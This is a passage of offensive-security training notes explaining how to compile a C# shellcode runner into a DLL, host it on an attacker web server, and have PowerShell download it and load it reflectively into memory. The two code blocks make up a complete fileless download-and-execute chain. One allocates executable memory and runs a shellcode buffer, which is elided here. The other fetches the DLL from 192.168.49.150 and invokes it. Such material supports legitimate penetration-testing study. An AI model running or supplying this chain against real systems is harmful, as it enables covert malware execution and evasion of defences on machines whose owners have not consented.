## The Need
No such need to learn this to be honest, we're just learning how we can combine the power of pre-compiled assemblies and load it directly into memory using powershell.

We will be separating these steps, to first, fetch the pre-compiled assembly and then, load it directly into memory.

## Begin
We can begin by simply copying the contents our previous [DotNet To JS](../02.%20JScript%20to%20C/DotNet%20To%20JS.md) code to our current session as follows:
1. DLLImport goes under the _Class1_ class
2. We will be copying the heart of our shellcode, in a new _runner_ method

The code will look as follows:
```C#
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ClassLibrary1
{
    public class Class1
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
     uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
          IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        public static void runner()
        {
            byte[] buf = new byte[641] {
            0xfc,0x48,.........,0xff,0xd5 };

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}

```

Compiling the above code, and placing it in the web root of our attacker machine, our first step is complete.

We can now start to build our powershell script which will load the dll into memory we can interact with it using the _GetType_ and _GetMethod_ methods, and finally call it through the _Invoke_ method.

Our script will look something like so:
```Powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.150/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```